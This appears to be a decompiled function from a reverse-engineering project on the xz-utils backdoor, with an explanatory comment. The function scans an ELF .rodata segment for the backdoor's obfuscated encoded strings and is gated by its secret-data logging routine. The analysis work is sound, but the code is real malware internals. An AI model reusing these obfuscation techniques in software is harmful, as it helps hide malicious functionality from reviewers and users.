// /home/kali/xzre-ghidra/xzregh/1020A0_elf_find_string.c
// Function: elf_find_string @ 0x1020A0
// Calling convention: __stdcall
// Prototype: char * __stdcall elf_find_string(elf_info_t * elf_info, EncodedStringId * stringId_inOut, void * rodata_start_ptr)


/*
 * AutoDoc: Iterates through the cached `.rodata` window, calling `get_string_id` on each byte offset until it encounters a recognizable encoded string. If `*stringId_inOut` is zero the first discovered string wins and its id is written back; otherwise the search continues until an exact id match is found. The optional `rodata_start_ptr` lets callers resume from a previous location or constrain the search to a suffix of the segment.
 *
 * The scan is gated by `secret_data_append_from_call_site`: if the telemetry helper returns FALSE the routine skips the walk entirely, ensuring rodata scrapes are always reflected in the secret-data log.
 */

#include "xzre_types.h"

char * elf_find_string(elf_info_t *elf_info,EncodedStringId *stringId_inOut,void *rodata_start_ptr)

{
  BOOL BVar1;
  EncodedStringId EVar2;
  char *string_begin;
  char *string_end;
  u64 rodata_window[2];
  
  BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xb6,7,10,FALSE);
  if (BVar1 != FALSE) {
    rodata_window[0] = 0;
    string_begin = (char *)elf_get_rodata_segment(elf_info,rodata_window);
    if ((string_begin != (char *)0x0) && (0x2b < rodata_window[0])) {
      string_end = string_begin + rodata_window[0];
      if (rodata_start_ptr != (void *)0x0) {
        if (string_end <= rodata_start_ptr) {
          return (char *)0x0;
        }
        if (string_begin < rodata_start_ptr) {
          string_begin = (char *)rodata_start_ptr;
        }
      }
      for (; string_begin < string_end; string_begin = string_begin + 1) {
        EVar2 = get_string_id(string_begin,string_end);
        if (EVar2 != 0) {
          if (*stringId_inOut == 0) {
            *stringId_inOut = EVar2;
            return string_begin;
          }
          if (*stringId_inOut == EVar2) {
            return string_begin;
          }
        }
      }
    }
  }
  return (char *)0x0;
}

